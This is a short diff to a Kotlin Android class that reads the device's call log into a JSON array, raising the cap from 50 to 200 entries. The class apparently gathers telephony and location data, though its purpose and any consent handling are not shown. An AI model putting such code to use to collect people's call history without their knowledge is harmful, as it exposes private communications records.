@@ -80,7 +80,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return obj
     }
 
-    // --- 2. Call Logs Query (Android 14 Safe) ---
+    // --- 2. Call Logs Query (Set to 200 Calls) ---
     fun getCallLogs(): JSONArray {
         val array = JSONArray()
         try {
@@ -105,7 +105,8 @@ class TelephonyAndLocationManager(private val context: Context) {
                 val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
 
                 var count = 0
-                while (it.moveToNext() && count < 50) {
+                // Limit set to 200 calls
+                while (it.moveToNext() && count < 200) {
                     val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
                     val typeStr = when (typeInt) {
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
